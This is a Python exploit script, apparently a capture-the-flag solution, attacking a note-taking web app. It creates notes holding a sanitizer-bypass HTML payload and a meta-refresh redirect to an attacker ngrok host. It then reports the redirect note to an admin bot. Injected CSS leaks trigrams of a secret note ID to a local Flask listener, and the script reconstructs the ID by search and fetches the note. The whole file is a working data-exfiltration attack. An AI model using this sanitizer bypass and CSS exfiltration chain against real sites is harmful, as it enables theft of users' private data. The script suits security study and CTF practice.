import asyncio
import httpx
from threading import Thread
import json
from tri import find_sequences_astar

PORT = 4444

# URL = "http://localhost:5001"
URL = "http://localhost"
PUBLIC_URL = "https://e4ccf83d1f88.ngrok-free.app"


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, verify=False, timeout=10000)
        self.session = ""

class API(BaseAPI):
    def register(self, username, email, password):
        return self.c.post("/identity/signup", data={
            "username": username,
            "email": email,
            "password": password,
            "confirm_password": password
        })
    
    def login(self, username, password):
        return self.c.post("/identity/signin", data={
            "username": username,
            "password": password
        })
    
    def create_note(self, title, content):
        return self.c.post("/workspace/compose", data={
            "title": title,
            "content": content
        })
    def report(self, url):
        return self.c.post(f"/report/", data={
            "url": url
        })
    
GSTART = ""
GEND = ""
GTRIGRAMS = []
PREV_TRIGRAMS_LEN = len(GTRIGRAMS)
TARGET = "http://note:5000/"
NOTES = {}


    
def webServer():
    from flask import Flask, request, send_from_directory, jsonify
    import random
    import string

    app = Flask(__name__, static_folder='static')

    index = open("static/index.html").read()

    @app.route("/static/<path:filename>")
    def static_files(filename):
        return send_from_directory(app.static_folder, filename)

    @app.route("/exploit", methods=["GET"])
    def exploit():
        global TARGET, NOTES
        html = index.replace("{{TARGET}}", TARGET)
        html = html.replace("{{NOTES}}", json.dumps(NOTES))
        return html, 200

    @app.route("/", methods=["GET"])
    def root():
        global GSTART, GEND, GTRIGRAMS
        START = request.args.get('START', "")
        END = request.args.get('END', "")
        MATCH = request.args.get('MATCH', "")

        if len(START) > 0:
            GSTART = START
        elif len(END) > 0:
            GEND = END
        elif len(MATCH) > 0:
            GTRIGRAMS.append(MATCH)
        print(GSTART, GEND, GTRIGRAMS)
        return jsonify(message="Hello World")

    return Thread(target=app.run, args=('0.0.0.0', PORT))

# sometimes it's not working, so we need to run it multiple times
async def main():
    api = API()
    server = webServer()
    server.start()

    await api.register("fooman", "fooman@fooman.com", "fooman")
    await api.login("fooman", "fooman")

    prefix = """<svg><a><desc><a><table><a></table><style><![CDATA[</style></svg><a id="AA"></body><!-- ]]></svg><p id="user-theme-styles">"""
    suffix = """</p>-->"""


    # redirect to our website using meta redirect
    res = await api.create_note("1", f"<meta http-equiv='refresh' content='0; url={PUBLIC_URL}/exploit'>")
    NOTES["redirect"] = res.headers["Location"]
    with open("static/css/first.css", "r") as fp:
        res = await api.create_note("2", f"{prefix}{fp.read()}{suffix}")
        print(res.text)
        NOTES["css1"] = res.headers["Location"]
    with open("static/css/second.css", "r") as fp:
        res = await api.create_note("3", f"{prefix}{fp.read()}{suffix}")
        print(res.text)
        NOTES["css2"] = res.headers["Location"]
    with open("static/css/third.css", "r") as fp:
        res = await api.create_note("4", f"{prefix}{fp.read()}{suffix}")
        print(res.text)
        NOTES["css3"] = res.headers["Location"]
    with open("static/css/fourth.css", "r") as fp:
        res = await api.create_note("5", f"{prefix}{fp.read()}{suffix}")
        print(res.text)
        NOTES["css4"] = res.headers["Location"]
    with open("static/css/fifth.css", "r") as fp:
        res = await api.create_note("6", f"{prefix}{fp.read()}{suffix}")
        print(res.text)
        NOTES["css5"] = res.headers["Location"]
    await api.report('http://note:5000'+NOTES["redirect"])

    await asyncio.sleep(1)
    print("Solving...")
    # generator
    result = find_sequences_astar(GTRIGRAMS, start=GSTART, end=GEND, target_length=25, max_results=1000)
    for r in result:
        print("Trying:", r)
        res = await api.c.get("/workspace/display/"+r)
        if "script" in res.text:
            print(res.text)
            break
    print("Done")

    server.join()

if __name__ == "__main__":
    asyncio.run(main())
